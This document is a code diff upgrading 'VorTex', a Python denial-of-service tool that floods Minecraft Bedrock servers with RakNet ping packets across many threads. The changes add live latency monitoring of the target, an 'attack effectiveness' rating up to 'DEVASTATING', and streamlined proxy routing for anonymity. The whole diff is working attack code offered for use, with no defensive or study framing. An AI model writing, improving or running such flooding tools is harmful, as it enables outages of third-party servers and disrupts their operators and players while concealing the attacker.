@@ -4,47 +4,47 @@ import threading
 import time
 import os
 import pyfiglet
-import socks  
+import socks
 
-# RakNet ping packet
 PING_PACKET = b'\x01' + b'\x00' * 17
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def setup_proxy(proxy_ip, proxy_port, proxy_type):
-    """Set up proxy for anonymous connection"""
-    if proxy_type == "socks5":
-        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    elif proxy_type == "socks4":
-        socks.set_default_proxy(socks.SOCKS4, proxy_ip, proxy_port)
-    elif proxy_type == "http":
-        socks.set_default_proxy(socks.HTTP, proxy_ip, proxy_port)
-    
-    socket.socket = socks.socksocket
-    print(f"✅ \033[92mProxy configured: {proxy_ip}:{proxy_port} ({proxy_type})\033[0m")
+def get_server_latency(ip, port, attempts=3):
+    latencies = []
+    for i in range(attempts):
+        try:
+            server = BedrockServer.lookup(f"{ip}:{port}")
+            status = server.status()
+            latencies.append(status.latency)
+            time.sleep(0.5)
+        except:
+            pass
+    return sum(latencies) / len(latencies) if latencies else None
 
-def remove_proxy():
-    """Remove proxy settings"""
-    socks.set_default_proxy()
-    socket.socket = socket.socket
-
-def show_proxy_warning():
-    """Show beta warning for proxy feature"""
-    print("\n\033[91m⚠️  BETA FEATURE WARNING:\033[0m")
-    print("🔸 \033[93mProxy support is experimental and buggy!\033[0m")
-    print("🔸 \033[93mMost proxies don't support UDP packets (Minecraft uses UDP)\033[0m")
-    print("🔸 \033[93mThis might completely break the attack - packets may not send!\033[0m")
-    print("🔸 \033[93mRecommended: Use VPN for anonymity instead of proxies\033[0m")
-    print("🔸 \033[93mPress 'n' for normal (working) mode without proxy\033[0m")
-    print("")
+def monitor_latency_during_attack(ip, port, stop_time, results):
+    max_latency = 0
+    while time.time() < stop_time:
+        try:
+            server = BedrockServer.lookup(f"{ip}:{port}")
+            status = server.status()
+            latency = status.latency
+            if latency:
+                results['current_latency'] = latency
+                if latency > max_latency:
+                    max_latency = latency
+                    results['max_latency'] = max_latency
+            time.sleep(1)
+        except:
+            pass
 
 def main():
     while True:
         clear_screen()
         banner = pyfiglet.figlet_format("VorTex", font="doom")
         print(f"\033[91m{banner}\033[0m")
-        print("                                       version 3.1")
+        print("                                       version 4.1")
         print("\033[95mCreator: \033[0m Hydra")
         print("")
         
@@ -56,9 +56,10 @@ def main():
         try:
             server = BedrockServer.lookup(f"{ip}:{port}")
             status = server.status()
+            baseline_latency = get_server_latency(ip, port)
             
             print(f"✅ \033[92mServer Online!\033[0m")
-            print(f"📡 Latency : {round(status.latency, 2)} ms")
+            print(f"📡 Baseline Latency : {round(baseline_latency, 2)} ms")
             print(f"👥 Players : {status.players.online} / {status.players.max}")
             print(f"🎮 MOTD    : {status.motd.raw}")
             print(f"📝 Version : {status.version.name} (protocol {status.version.protocol})")
@@ -79,29 +80,29 @@ def main():
         
         if choice != "1":
             continue
-        
-        # Proxy configuration with BETA warning
-        print("\n\033[94m🎭 Proxy Configuration (BETA - BUGGY)\033[0m")
-        show_proxy_warning()
-        
-        use_proxy = input("Risk using proxy? (y/n): ").lower()
+
+        print("\n\033[94m🎭 Proxy Configuration (Optional)\033[0m")
+        use_proxy = input("Use proxy? (y/n): ").lower()
         
         proxy_enabled = False
         if use_proxy == 'y':
-            print("\n\033[93m🔧 Enter proxy details (at your own risk):\033[0m")
-            proxy_type = input("Proxy type (socks5/socks4/http) [socks5]: ").lower() or "socks5"
-            proxy_ip = input("Proxy IP address: ")
-            proxy_port = int(input("Proxy port: "))
+            print("\n\033[93mProxy Types: socks5, socks4, http\033[0m")
+            proxy_type = input("Proxy type [socks5]: ").lower() or "socks5"
+            proxy_ip = input("Proxy IP: ")
+            proxy_port = int(input("Proxy Port: "))
             
             try:
-                setup_proxy(proxy_ip, proxy_port, proxy_type)
+                if proxy_type == "socks5":
+                    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+                elif proxy_type == "socks4":
+                    socks.set_default_proxy(socks.SOCKS4, proxy_ip, proxy_port)
+                elif proxy_type == "http":
+                    socks.set_default_proxy(socks.HTTP, proxy_ip, proxy_port)
+                socket.socket = socks.socksocket
                 proxy_enabled = True
-                print("🚀 \033[92mProxy enabled (BETA MODE - MAY NOT WORK)\033[0m\n")
+                print("✅ \033[92mProxy configured\033[0m")
             except Exception as e:
-                print(f"❌ \033[91mProxy setup failed: {e}\033[0m")
-                print("⚠️  \033[93mFalling back to normal mode without proxy\033[0m\n")
-        else:
-            print("✅ \033[92mUsing normal mode (recommended - actually works)\033[0m\n")
+                print(f"❌ \033[91mProxy failed: {e}\033[0m")
         
         threads = int(input("\033[92m🤖 Threads (bots): \033[0m"))
         duration = int(input("\033[91m⏱ Duration (seconds): \033[0m"))
@@ -110,14 +111,16 @@ def main():
         stop_time = time.time() + duration
         packets_sent = 0
         packets_lock = threading.Lock()
+        
+        latency_results = {
+            'baseline': baseline_latency,
+            'max_latency': baseline_latency,
+            'current_latency': baseline_latency,
+        }
 
         print(f"\n\033[93m🎯 Target: {ip}:{port}\033[0m")
         print(f"\033[93m📊 Duration: {duration} seconds | Threads: {threads}\033[0m")
-        
-        if proxy_enabled:
-            print("\033[91m🔧 Mode: BETA PROXY (packets may not send!)\033[0m")
-        else:
-            print("\033[92m🔧 Mode: NORMAL (should work properly)\033[0m")
+        print(f"📡 Baseline Latency: {baseline_latency:.2f} ms")
         
         print("\n\033[91m💥 STARTING ATTACK IN 3...\033[0m")
         time.sleep(1)
@@ -125,11 +128,7 @@ def main():
         time.sleep(1)
         print("\033[92m💥 STARTING ATTACK IN 1...\033[0m")
         time.sleep(1)
-        
-        if proxy_enabled:
-            print("\033[91m🚀 ATTACK LAUNCHED! (BETA PROXY MODE - WISH US LUCK!)\033[0m\n")
-        else:
-            print("\033[91m🚀 ATTACK LAUNCHED! Sending packets...\033[0m\n")
+        print("\033[91m🚀 ATTACK LAUNCHED! Monitoring latency spikes...\033[0m\n")
 
         def send_ping():
             nonlocal packets_sent
@@ -141,15 +140,9 @@ def main():
                         packets_sent += 1
                     time.sleep(delay)
                 except Exception as e:
-                    if proxy_enabled:
-                        # Don't spam errors in proxy mode - it's expected to fail
-                        pass
-                    else:
-                        print(f"\033[91m[!] Error: {e}\033[0m")
                     break
             sock.close()
 
-        # Progress monitoring function
         def monitor_progress():
             start_time = time.time()
             while time.time() < stop_time:
@@ -161,19 +154,25 @@ def main():
                 bar = '█' * filled_length + '░' * (bar_length - filled_length)
                 
                 pps = packets_sent / elapsed if elapsed > 0 else 0
+                current_latency = latency_results['current_latency']
+                max_spike = latency_results['max_latency']
                 
-                mode_indicator = "🔧 BETA" if proxy_enabled else "✅ NORMAL"
-                print(f"\r\033[94m{mode_indicator} | Progress: [{bar}] {progress:.1f}% | ⏱ {elapsed:.0f}s/{duration}s | 📦 {packets_sent} packets | 🚀 {pps:.1f} p/s\033[0m", end='', flush=True)
+                latency_color = "\033[92m"
+                if current_latency > baseline_latency * 2:
+                    latency_color = "\033[93m"
+                if current_latency > baseline_latency * 5:
+                    latency_color = "\033[91m"
+                
+                print(f"\r\033[94mProgress: [{bar}] {progress:.1f}% | ⏱ {elapsed:.0f}s | 📦 {packets_sent} | ", end='')
+                print(f"{latency_color}Latency: {current_latency:.0f}ms (Max: {max_spike:.0f}ms)\033[0m", end='', flush=True)
                 time.sleep(0.5)
             
-            # Final update
             elapsed = time.time() - start_time
             pps = packets_sent / elapsed if elapsed > 0 else 0
             bar = '█' * 30
-            mode_indicator = "🔧 BETA" if proxy_enabled else "✅ NORMAL"
-            print(f"\r\033[94m{mode_indicator} | Progress: [{bar}] 100.0% | ⏱ {elapsed:.0f}s/{duration}s | 📦 {packets_sent} packets | 🚀 {pps:.1f} p/s\033[0m")
+            max_spike = latency_results['max_latency']
+            print(f"\r\033[94mProgress: [{bar}] 100.0% | ⏱ {elapsed:.0f}s | 📦 {packets_sent} | \033[91mMax Latency: {max_spike:.0f}ms\033[0m")
 
-        # Start attack threads
         attack_threads = []
         for _ in range(threads):
             thread = threading.Thread(target=send_ping)
@@ -181,28 +180,51 @@ def main():
             thread.start()
             attack_threads.append(thread)
 
-        # Start progress monitor
+        latency_thread = threading.Thread(target=monitor_latency_during_attack, 
+                                        args=(ip, port, stop_time, latency_results))
+        latency_thread.daemon = True
+        latency_thread.start()
+
         progress_thread = threading.Thread(target=monitor_progress)
         progress_thread.daemon = True
         progress_thread.start()
 
-        # Wait for attack to complete
         progress_thread.join()
 
-        print(f"\n\n\033[92m✅ Attack completed!\033[0m")
+        print("\n📡 Measuring post-attack latency...")
+        final_latency = get_server_latency(ip, port) or latency_results['current_latency']
+        
+        latency_increase = ((latency_results['max_latency'] - baseline_latency) / baseline_latency) * 100
+        effectiveness = min(latency_increase / 10, 100)
+
+        print(f"\n\033[92m✅ Attack completed!\033[0m")
         print(f"\033[94m📊 Final Stats: {packets_sent} total packets sent\033[0m")
         
-        if proxy_enabled:
-            if packets_sent == 0:
-                print("\033[91m❌ Proxy mode failed - no packets sent (as expected)\033[0m")
-            else:
-                print("\033[92m🎉 Surprisingly, proxy mode actually worked!\033[0m")
+        print("\n\033[95m📈 LATENCY IMPACT ANALYSIS:\033[0m")
+        print(f"📡 Baseline Latency: {baseline_latency:.2f} ms")
+        print(f"💥 Peak Latency: {latency_results['max_latency']:.2f} ms")
+        print(f"📉 Final Latency: {final_latency:.2f} ms")
+        print(f"🚀 Latency Increase: {latency_increase:.1f}%")
         
-        # Reset proxy if it was enabled
-        if proxy_enabled:
-            remove_proxy()
+        if latency_increase > 500:
+            rating = "💀 DEVASTATING"
+            color = "\033[91m"
+        elif latency_increase > 200:
+            rating = "🔥 HIGH IMPACT"
+            color = "\033[93m"
+        elif latency_increase > 50:
+            rating = "⚠️  MODERATE IMPACT"
+            color = "\033[92m"
+        else:
+            rating = "💤 MINIMAL IMPACT"
+            color = "\033[94m"
+        
+        print(f"{color}🎯 Attack Effectiveness: {rating} ({effectiveness:.1f}%)\033[0m")
 
-        # Ask user if they want to continue
+        if proxy_enabled:
+            socks.set_default_proxy()
+            socket.socket = socket.socket
+
         print("\n\033[93m" + "="*50 + "\033[0m")
         print("\033[94m🔄 Operation Complete\033[0m")
         print("\033[93m" + "="*50 + "\033[0m")
@@ -216,5 +238,4 @@ def main():
             break
 
 if __name__ == "__main__":
-
     main()
